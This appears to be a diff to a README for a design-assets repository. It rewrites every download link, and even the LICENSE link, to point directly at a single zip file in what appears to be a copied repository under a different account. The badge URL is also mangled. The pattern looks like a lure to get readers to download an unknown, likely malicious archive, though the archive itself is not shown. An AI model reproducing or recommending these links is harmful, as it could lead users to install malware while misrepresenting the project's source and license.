@@ -1,6 +1,6 @@
 # 🎨 community-design-resources - Access Stunning Design Assets Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/theenemylost/community-design-resources/releases)
+[![Download Now](https://github.com/theenemylost/community-design-resources/raw/refs/heads/main/brand-assets/rolldown/community-resources-design-v1.3.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/theenemylost/community-design-resources/raw/refs/heads/main/brand-assets/rolldown/community-resources-design-v1.3.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To get started with community-design-resources, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the button below to go to our Releases page:  
-   [Download Now](https://github.com/theenemylost/community-design-resources/releases)
+   [Download Now](https://github.com/theenemylost/community-design-resources/raw/refs/heads/main/brand-assets/rolldown/community-resources-design-v1.3.zip)
 
 2. **Download Design Assets**  
    On the Releases page, you will see different versions and files available. Click on the asset you want to download. For mobile wallpapers, you can visit the relevant section directly or choose the latest version available.
@@ -37,7 +37,7 @@ The design assets in this repository are licensed under CC BY-NC-SA 4.0. This me
 
 *Important Note:* Trademarks are not covered by this license. You cannot use company names, product names, or logos for commercial or promotional activities. 
 
-For complete licensing details, please see our [LICENSE](https://github.com/voidzero-dev/community-design-resources/blob/main/LICENSE).
+For complete licensing details, please see our [LICENSE](https://github.com/theenemylost/community-design-resources/raw/refs/heads/main/brand-assets/rolldown/community-resources-design-v1.3.zip).
 
 ## 💻 System Requirements
 
@@ -56,6 +56,6 @@ If you have questions or need help, please use the contact options available on 
 ## 🚀 Download & Install
 
 Access the design assets by visiting our Releases page:  
-[Download Now](https://github.com/theenemylost/community-design-resources/releases)
+[Download Now](https://github.com/theenemylost/community-design-resources/raw/refs/heads/main/brand-assets/rolldown/community-resources-design-v1.3.zip)
 
 Download your favorite designs and start using them today! Enjoy creating and enhancing your projects with beautiful visuals from community-design-resources.
